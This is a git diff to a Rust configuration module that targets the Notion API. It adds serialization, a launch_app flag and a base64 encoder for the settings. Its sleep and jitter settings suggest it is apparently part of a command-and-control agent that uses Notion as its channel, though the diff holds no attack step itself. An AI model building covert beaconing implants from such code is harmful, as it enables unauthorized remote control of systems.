@@ -5,6 +5,9 @@ use std::error::Error;
 use std::io::{self, Write};
 use std::fs;
 use std::fmt;
+use serde::{Deserialize, Serialize};
+use serde_json::{Value, to_string, to_value};
+use base64::encode;
 
 pub const URL_BASE: &str = "https://api.notion.com/v1";
 pub const DEFAULT_API_KEY: &str = "<<API_KEY>>";
@@ -22,20 +25,20 @@ pub const CONFIG_FILE_PATH: &str = "./cfg.json";
 
 /// Storing Config Options as a struct for ergonomics.
 ///
-/// sleep_interval: u64 for use with `std::thread::sleep()`
-///
-/// parent_page_id: String which eventually can be added at compile
-///
-/// api_key: String also added at compile
+/// * `sleep_interval`: u64 for use with `std::thread::sleep()`
+/// * `parent_page_id`: String which eventually can be added at compile
+/// * `api_key`: String also added at compile
+/// * `config_file_path`: String where the json for config will be read/written
+/// * `launch_app`: Whether to launch the Notion web app
 /// 
-/// config_file_path: String where the json for config will be read/written
-#[derive(Debug, Serialize)]
+#[derive(Debug, Serialize, Deserialize)]
 pub struct ConfigOptions {
     pub sleep_interval: u64,
     pub jitter_time: u64,
     pub parent_page_id: String,
     pub api_key: String,
-    pub config_file_path: String
+    pub config_file_path: String,
+    pub launch_app: bool
 }
 
 #[derive(Debug)]
@@ -52,16 +55,30 @@ impl Error for ConfigError {}
 impl ConfigOptions {
 
     /// Converts loaded json data into `ConfigOptions`
-    pub fn from_json(j: serde_json::Value) -> ConfigOptions {
-        println!("[*] Config options: {:?}", j);
+    pub fn from_json(j: Value) -> ConfigOptions {
+        println!("{:?}", j);
         ConfigOptions {
             sleep_interval: j["sleep_interval"].as_u64().unwrap(),
             jitter_time: j["jitter_time"].as_u64().unwrap(),
             parent_page_id: j["parent_page_id"].to_string().replace('"', ""),
             api_key: j["api_key"].to_string().replace('"', ""),
-            config_file_path: j["config_file_path"].to_string().replace('"', "")
+            config_file_path: j["config_file_path"].to_string().replace('"', ""),
+            launch_app: j["launch_app"].as_bool().unwrap_or_default()
         }
     }
+
+    /// Produces the Jsonified version of the ConfigOptions
+    pub fn to_json(&self) -> Value {
+        to_value(self).unwrap()
+    }
+
+    /// Produces a base64 encoded String of the Options.
+    ///
+    /// This is useful for sending ConfigOptions to launch commands
+    pub fn to_base64(&self) -> String {
+        encode(to_string(self).unwrap().as_bytes())
+    }
+
 }
 
 /// Retrieves config options from the terminal.
@@ -104,7 +121,8 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
             jitter_time: jitter_time.trim().parse().unwrap(),
             parent_page_id: parent_page_id.trim().to_string(),
             api_key: api_key.trim().to_string(),
-            config_file_path: config_file_path.trim().to_string()
+            config_file_path: config_file_path.trim().to_string(),
+            launch_app: false
         }
     )
 }
@@ -116,7 +134,8 @@ pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
         jitter_time: DEFAULT_JITTER_TIME.parse().unwrap_or_else(|_| 0),
         parent_page_id: DEFAULT_PARENT_PAGE_ID.to_string(),
         api_key: DEFAULT_API_KEY.to_string(),
-        config_file_path: CONFIG_FILE_PATH.to_string()
+        config_file_path: CONFIG_FILE_PATH.to_string(),
+        launch_app: true
     };
     
     Ok(config_options)
